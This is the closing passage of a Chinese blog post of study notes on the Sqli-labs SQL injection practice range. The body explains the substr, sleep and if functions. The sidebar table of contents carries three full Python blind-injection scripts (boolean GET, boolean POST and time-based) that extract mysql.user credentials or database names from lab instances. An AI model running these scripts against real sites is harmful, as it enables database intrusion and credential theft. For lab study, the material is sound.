<li>substr(obj，start，length)<br>obj：从哪个内容中截取，可以是数值或字符串。<br>start：从哪个字符开始截取（1开始，而不是0开始）<br>length：截取几个字符（空格也算一个字符）<br>(1)截取字符串<br><img src="/2022/11/21/Sqli-labs-Page-1/17.png"><br>如果只给「一个参数」，则默认截取到最后。<br><img src="/2022/11/21/Sqli-labs-Page-1/18.png"><br>substr允许参数的「值为负数」，当我们不知道字符串的具体长度，但想要截取最后几个字符时，可以将参数写成负数，从倒数第几个字符串开始截取，截取到最后。<br><img src="/2022/11/21/Sqli-labs-Page-1/19.png"><br>(2)截取查询结果<br>substr允许将其他语句的查询结果作为参数，进行截取（注意用括号括起来）。<br>比如，截取查询结果中的前5个字符：<br><img src="/2022/11/21/Sqli-labs-Page-1/20.png"><br>补充：substr还有另外一种语法格式<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(obj FROM start FOR length)</span><br></pre></td></tr></table></div></figure>
<img src="/2022/11/21/Sqli-labs-Page-1/21.png"></li>
<li>sleep(time):指定时间（单位秒），也就是让程序停止执行一段指定的时间。</li>
<li>if(condition，T，F):条件是否成立，成立时执行一条语句，不成立时执行另一条语句。</li>
</ol>
<hr>

        <h2 id="and-和-or">
          <a href="#and-和-or" class="heading-link"><i class="fas fa-link"></i></a><a href="#and-和-or" class="headerlink" title="and 和 or"></a>and 和 or</h2>
      <p>今天在复盘布尔盲注的时候发现了一个问题：<br><img src="/2022/11/21/Sqli-labs-Page-1/22.png"><br>当我们使用布尔盲注探测数据库名的长度时，发现探测出错；明明我们的数据库名长度为8，但当我们令其大于10的时候，页面返回是正确的，也就证明探测出错<br>咨询了一下学长：</p>
<hr>

        <h2 id="正式开始注入，我们使用and或者or来对代码进行连接，一定要注意，and的true返回条件是左右两边都为真，or的true返回条件只需要有一边为真就行了，因此在这里前面id如果存在于数据库之中要用and，不存在则用or。">
          <a href="#正式开始注入，我们使用and或者or来对代码进行连接，一定要注意，and的true返回条件是左右两边都为真，or的true返回条件只需要有一边为真就行了，因此在这里前面id如果存在于数据库之中要用and，不存在则用or。" class="heading-link"><i class="fas fa-link"></i></a><a href="#正式开始注入，我们使用and或者or来对代码进行连接，一定要注意，and的true返回条件是左右两边都为真，or的true返回条件只需要有一边为真就行了，因此在这里前面id如果存在于数据库之中要用and，不存在则用or。" class="headerlink" title="正式开始注入，我们使用and或者or来对代码进行连接，一定要注意，and的true返回条件是左右两边都为真，or的true返回条件只需要有一边为真就行了，因此在这里前面id如果存在于数据库之中要用and，不存在则用or。"></a>正式开始注入，我们使用and或者or来对代码进行连接，一定要注意，and的true返回条件是左右两边都为真，or的true返回条件只需要有一边为真就行了，因此在这里前面id如果存在于数据库之中要用and，不存在则用or。</h2>
      <p><img src="/2022/11/21/Sqli-labs-Page-1/23.png"><br>因为此时我们令id&#x3D;1，且使用or来连接，所以整个语句是正确的，后台可以查询到有id&#x3D;1，所以此时页面会回显正确,此时我们再将id&#x3D;0；发现已经可以正常回显报错了<br><img src="/2022/11/21/Sqli-labs-Page-1/24.png"></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/">https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/11/24/Less-23/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Sqli-labs-Less-23~24</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/11/20/Less18/"><span class="paginator-prev__text">Sqli-labs-18~22</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%85%A2%E6%85%A2%E4%BA%A6%E7%81%BF%E7%81%BF%EF%BC%8C%E5%8E%86%E7%BB%8F%E4%B8%80%E4%B8%AA%E6%9C%88%E5%B7%A6%E5%8F%B3%E7%BB%88%E4%BA%8E%E5%B0%86sqlilabs%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%88%B7%E5%AE%8C%EF%BC%9B%E8%87%B3%E6%AD%A4%E4%B9%9F%E5%AF%B9sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%9F%BA%E7%A1%80%E5%A7%BF%E5%8A%BF%E6%9C%89%E4%BA%86%E4%B8%80%E5%AE%9A%E7%9A%84%E4%BA%86%E8%A7%A3%EF%BC%9B%E4%BB%8A%E5%A4%A9%E6%89%93%E7%AE%97%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E5%88%B0%E7%9A%84%E4%B8%9C%E8%A5%BF"><span class="toc-number">1.</span> <span class="toc-text">
          慢慢亦灿灿，历经一个月左右终于将sqlilabs第一章刷完；至此也对sql注入的原理和基础姿势有了一定的了解；今天打算记录一下我在这个靶场学习到的东西</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9A%84%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">
          一.基础的注入姿势：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%EF%BC%9A%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">
          1：联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">
          2.报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.</span> <span class="toc-text">
          3.布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B5%E9%9D%A2%E5%8F%AA%E6%9C%89%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F%E5%92%8C%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5%E8%BF%99%E4%B8%A4%E7%A7%8D%E6%83%85%E5%86%B5%E6%97%B6%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E3%80%82%E8%BF%99%E4%B8%80%E9%83%A8%E5%88%86%E6%88%91%E5%9C%A8%E5%88%9D%E8%AF%86%E7%9B%B2%E6%B3%A8%E9%87%8C%E9%9D%A2%E6%9C%89%E8%A7%A3%E9%87%8A%E8%BF%87%EF%BC%9B%E8%BF%99%E9%87%8C%E5%B0%B1%E4%B8%8D%E8%BF%87%E5%A4%9A%E8%A7%A3%E9%87%8A%E4%BA%86%E4%BD%BF%E7%94%A8%E5%89%8D%E6%8F%90%EF%BC%9A%E9%A1%B5%E9%9D%A2%E5%8F%AA%E6%9C%89%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F%E5%92%8C%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5%E8%BF%99%E4%B8%A4%E7%A7%8D%E6%83%85%E5%86%B5%E6%97%B6%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E3%80%82%E5%90%8C%E6%97%B6%E6%BB%A1%E8%B6%B3%E4%BB%A5%E4%B8%8B%E4%B8%A4%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%9A-id-x3D-1%E2%80%99-and-1-x3D-1-%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA-id-x3D-1%E2%80%99-and-1-x3D-0-%E5%BC%82%E5%B8%B8-%E7%A9%BA-%E6%98%BE%E7%A4%BA%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8D%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%9A%84%E6%83%85%E5%86%B5%E5%9B%A0%E4%B8%BA%E5%B8%83%E5%B0%94%E6%89%8B%E5%B7%A5%E7%9B%B2%E6%B3%A8%E8%80%97%E6%97%B6%E8%BE%83%E9%95%BF%E4%B8%94%E7%B9%81%E7%90%90%EF%BC%8C%E6%89%80%E4%BB%A5%E6%9C%89%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%951-%E5%80%9F%E5%8A%A9bp%E7%9A%84%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97%E8%BF%9B%E8%A1%8C%E8%BE%85%E5%8A%A9%E6%88%96%E8%80%852-%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4get%E8%AF%B7%E6%B1%82%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%EF%BC%9Apost%E8%AF%B7%E6%B1%82%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">
          页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。这一部分我在初识盲注里面有解释过；这里就不过多解释了使用前提：页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。同时满足以下两种情况：?id&#x3D;1’ and 1&#x3D;1# 正常显示?id&#x3D;1’ and 1&#x3D;0# 异常(空)显示可以使用布尔盲注的情况不可以使用布尔盲注的情况因为布尔手工盲注耗时较长且繁琐，所以有两种方法1.借助bp的爆破模块进行辅助或者2.使用脚本进行爆破get请求盲注脚本：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import requests# 只需要修改url 和 两个payload即可# 目标网址（不带参数）url &#x3D; &quot;http:&#x2F;&#x2F;3534c6c2bffd4225bf3409ae9a2ec278.app.mituan.zone&#x2F;Less-5&#x2F;&quot;# 猜解长度使用的payloadpayload_len &#x3D; &quot;&quot;&quot;?id&#x3D;1&#39; and length(                  (select group_concat(user,password)                    from mysql.user)                ) &lt; {n} -- a&quot;&quot;&quot;# 枚举字符使用的payloadpayload_str &#x3D; &quot;&quot;&quot;?id&#x3D;1&#39; and ascii(                  substr(                    (select group_concat(user,password)                    from mysql.user)                  ,{n},1)                ) &#x3D; {r} -- a&quot;&quot;&quot;# 获取长度def getLength(url, payload):    length &#x3D; 1  # 初始测试长度为1    while True:        response &#x3D; requests.get(url&#x3D; url+payload_len.format(n&#x3D; length))        # 页面中出现此内容则表示成功        if &#39;You are in...........&#39; in response.text:            print(&#39;测试长度完成，长度为：&#39;, length,)            return length;        else:            print(&#39;正在测试长度：&#39;,length)            length +&#x3D; 1  # 测试长度递增# 获取字符def getStr(url, payload, length):    str &#x3D; &#39;&#39;  # 初始表名&#x2F;库名为空    # 第一层循环，截取每一个字符    for l in range(1, length+1):        # 第二层循环，枚举截取字符的每一种可能性        for n in range(33, 126):            response &#x3D; requests.get(url&#x3D; url+payload_str.format(n&#x3D; l, r&#x3D; n))            # 页面中出现此内容则表示成功            if &#39;You are in...........&#39; in response.text:                str+&#x3D; chr(n)                print(&#39;第&#39;, l, &#39;个字符猜解成功：&#39;, str)                break;    return str;# 开始猜解length &#x3D; getLength(url, payload_len)getStr(url, payload_str, length)post请求盲注脚本：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import requests# 网站路径url &#x3D; &quot;http:&#x2F;&#x2F;7eb82265178a435aa86d6728e7b1e08a.app.mituan.zone&#x2F;Less-13&#x2F;&quot;# 判断长度的payloadpayload_len &#x3D; &quot;&quot;&quot;a&#39;) or length(                    (select group_concat(user,password)                      from mysql.user)                )&gt;{n} -- a&quot;&quot;&quot;# 枚举字符的payloadpayload_str &#x3D; &quot;&quot;&quot;a&#39;) or ascii(                    substr(                        (select group_concat(user,password)                        from mysql.user)                    ,{l},1)                )&#x3D;{n} -- a&quot;&quot;&quot;# post请求参数data&#x3D; {    &quot;uname&quot; : &quot;a&#39;) or 1 -- a&quot;,    &quot;passwd&quot; : &quot;1&quot;,    &quot;submit&quot; : &quot;Submit&quot;}# 判断长度def getLen(payload_len):    length &#x3D; 1    while True:        # 修改请求参数        data[&quot;uname&quot;] &#x3D; payload_len.format(n &#x3D; length)        response &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        # 出现此内容为登录成功        if &#39;..&#x2F;images&#x2F;flag.jpg&#39; in response.text:            print(&#39;正在测试长度：&#39;, length)            length +&#x3D; 1        else:            print(&#39;测试成功，长度为：&#39;, length)            return length;# 枚举字符def getStr(length):    str &#x3D; &#39;&#39;    # 从第一个字符开始截取    for l in range(1, length+1):        # 枚举字符的每一种可能性        for n in range(32, 126):            data[&quot;uname&quot;] &#x3D; payload_str.format(l&#x3D;l, n&#x3D;n)            response &#x3D; requests.post(url&#x3D;url, data&#x3D;data)            if &#39;..&#x2F;images&#x2F;flag.jpg&#39; in response.text:                str +&#x3D; chr(n)                print(&#39;第&#39;, l, &#39;个字符枚举成功：&#39;,str )                breaklength &#x3D; getLen(payload_len)getStr(length)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%EF%BC%9A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.</span> <span class="toc-text">
          4：时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A-1-%E9%A1%B5%E9%9D%A2%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8-2-%E9%A1%B5%E9%9D%A2%E4%B8%8D%E6%98%BE%E7%A4%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%EF%BC%89-3-%E6%97%A0%E8%AE%BA%E6%88%90%E5%8A%9F%E8%BF%98%E6%98%AF%E5%A4%B1%E8%B4%A5%EF%BC%8C%E9%A1%B5%E9%9D%A2%E5%8F%AA%E5%93%8D%E5%BA%94%E4%B8%80%E7%A7%8D%E7%BB%93%E6%9E%9C%EF%BC%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%EF%BC%89%E8%BF%99%E4%B8%80%E9%83%A8%E5%88%86%E6%88%91%E5%9C%A8%E5%88%9D%E8%AF%86%E7%9B%B2%E6%B3%A8%E9%87%8C%E9%9D%A2%E6%9C%89%E8%A7%A3%E9%87%8A%E8%BF%87%EF%BC%9B%E8%BF%99%E9%87%8C%E5%B0%B1%E4%B8%8D%E8%BF%87%E5%A4%9A%E8%A7%A3%E9%87%8A%E4%BA%86%E3%80%82%E5%9B%A0%E4%B8%BA%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E4%BC%9A%E5%8F%97%E5%88%B0%E7%BD%91%E7%BB%9C%E4%B8%8D%E7%A8%B3%E5%AE%9A%E7%9A%84%E5%BD%B1%E5%93%8D%E5%92%8C%E5%85%B6%E6%9C%AC%E8%BA%AB%E7%9A%84%E7%B9%81%E7%90%90%E7%A8%8B%E5%BA%A6%EF%BC%8C%E6%88%91%E4%BB%AC%E4%B8%80%E8%88%AC%E4%BC%9A%E4%BD%BF%E7%94%A8bp%E8%BF%9B%E8%A1%8C%E8%BE%85%E5%8A%A9%E6%88%96%E8%80%85%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">8.</span> <span class="toc-text">
          使用场景：(1):页面没有回显位置(联合注入无法使用)(2):页面不显示数据库的报错信息（报错注入无法使用）(3)无论成功还是失败，页面只响应一种结果（布尔盲注无法使用）这一部分我在初识盲注里面有解释过；这里就不过多解释了。因为时间盲注会受到网络不稳定的影响和其本身的繁琐程度，我们一般会使用bp进行辅助或者使用脚本盲注脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import requestsimport time# 将url 替换成你的靶场关卡网址# 修改两个对应的payload# 目标网址（不带参数）url &#x3D; &quot;http:&#x2F;&#x2F;0f3687d08b574476ba96442b3ec2c120.app.mituan.zone&#x2F;Less-9&#x2F;&quot;# 猜解长度使用的payloadpayload_len &#x3D; &quot;&quot;&quot;?id&#x3D;1&#39; and if(  (length(database()) &#x3D;{n}),sleep(5),3) -- a&quot;&quot;&quot;# 枚举字符使用的payloadpayload_str &#x3D; &quot;&quot;&quot;?id&#x3D;1&#39; and if(  (ascii(    substr(    (database())    ,{n},1)  ) &#x3D;{r}), sleep(5), 3) -- a&quot;&quot;&quot;# 获取长度def getLength(url, payload):    length &#x3D; 1  # 初始测试长度为1    while True:        start_time &#x3D; time.time()        response &#x3D; requests.get(url&#x3D; url+payload_len.format(n&#x3D; length))        # 页面响应时间 &#x3D; 结束执行的时间 - 开始执行的时间        use_time &#x3D; time.time() - start_time        # 响应时间&gt;5秒时，表示猜解成功        if use_time &gt; 5:            print(&#39;测试长度完成，长度为：&#39;, length,)            return length;        else:            print(&#39;正在测试长度：&#39;,length)            length +&#x3D; 1  # 测试长度递增# 获取字符def getStr(url, payload, length):    str &#x3D; &#39;&#39;  # 初始表名&#x2F;库名为空    # 第一层循环，截取每一个字符    for l in range(1, length+1):        # 第二层循环，枚举截取字符的每一种可能性        for n in range(33, 126):            start_time &#x3D; time.time()            response &#x3D; requests.get(url&#x3D; url+payload_str.format(n&#x3D; l, r&#x3D; n))            # 页面响应时间 &#x3D; 结束执行的时间 - 开始执行的时间            use_time &#x3D; time.time() - start_time            # 页面中出现此内容则表示成功            if use_time &gt; 5:                str+&#x3D; chr(n)                print(&#39;第&#39;, l, &#39;个字符猜解成功：&#39;, str)                break;    return str;# 开始猜解length &#x3D; getLength(url, payload_len)getStr(url, payload_str, length)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E6%98%AF%E5%85%88%E8%80%83%E8%99%91%E4%BD%BF%E7%94%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-gt-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-gt-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-gt-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">9.</span> <span class="toc-text">
          一般是先考虑使用联合注入&gt;报错注入&gt;布尔盲注&gt;时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-SQL%E8%AF%AD%E5%8F%A5%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">10.</span> <span class="toc-text">
          二.SQL语句中的函数：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#and-%E5%92%8C-or"><span class="toc-number">11.</span> <span class="toc-text">
          and 和 or</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%BC%8F%E5%BC%80%E5%A7%8B%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8and%E6%88%96%E8%80%85or%E6%9D%A5%E5%AF%B9%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5%EF%BC%8C%E4%B8%80%E5%AE%9A%E8%A6%81%E6%B3%A8%E6%84%8F%EF%BC%8Cand%E7%9A%84true%E8%BF%94%E5%9B%9E%E6%9D%A1%E4%BB%B6%E6%98%AF%E5%B7%A6%E5%8F%B3%E4%B8%A4%E8%BE%B9%E9%83%BD%E4%B8%BA%E7%9C%9F%EF%BC%8Cor%E7%9A%84true%E8%BF%94%E5%9B%9E%E6%9D%A1%E4%BB%B6%E5%8F%AA%E9%9C%80%E8%A6%81%E6%9C%89%E4%B8%80%E8%BE%B9%E4%B8%BA%E7%9C%9F%E5%B0%B1%E8%A1%8C%E4%BA%86%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%9C%A8%E8%BF%99%E9%87%8C%E5%89%8D%E9%9D%A2id%E5%A6%82%E6%9E%9C%E5%AD%98%E5%9C%A8%E4%BA%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8B%E4%B8%AD%E8%A6%81%E7%94%A8and%EF%BC%8C%E4%B8%8D%E5%AD%98%E5%9C%A8%E5%88%99%E7%94%A8or%E3%80%82"><span class="toc-number">12.</span> <span class="toc-text">
          正式开始注入，我们使用and或者or来对代码进行连接，一定要注意，and的true返回条件是左右两边都为真，or的true返回条件只需要有一边为真就行了，因此在这里前面id如果存在于数据库之中要用and，不存在则用or。</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">102</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Views</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>